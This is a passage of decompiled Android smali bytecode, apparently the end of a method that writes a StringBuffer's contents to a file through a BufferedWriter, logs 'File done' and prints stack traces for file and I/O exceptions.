    invoke-direct {v1, v2}, Ljava/io/OutputStreamWriter;-><init>(Ljava/io/OutputStream;)V

    invoke-direct {v0, v1}, Ljava/io/BufferedWriter;-><init>(Ljava/io/Writer;)V

    .line 274
    .local v0, "bw":Ljava/io/BufferedWriter;
    invoke-virtual {p1}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/io/BufferedWriter;->write(Ljava/lang/String;)V

    .line 276
    invoke-virtual {v0}, Ljava/io/BufferedWriter;->close()V

    .line 278
    const-string v1, "myLogs"

    const-string v2, "File done"

    invoke-static {v1, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/io/FileNotFoundException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 283
    nop

    .end local v0    # "bw":Ljava/io/BufferedWriter;
    goto :goto_0

    .line 281
    :catch_0
    move-exception v0

    .line 282
    .local v0, "e":Ljava/io/IOException;
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_0

    .line 279
    .end local v0    # "e":Ljava/io/IOException;
    :catch_1
    move-exception v0

    .line 280
    .local v0, "e":Ljava/io/FileNotFoundException;
    invoke-virtual {v0}, Ljava/io/FileNotFoundException;->printStackTrace()V

    .line 283
    .end local v0    # "e":Ljava/io/FileNotFoundException;
    nop

    .line 284
    :goto_0
    return-void
.end method
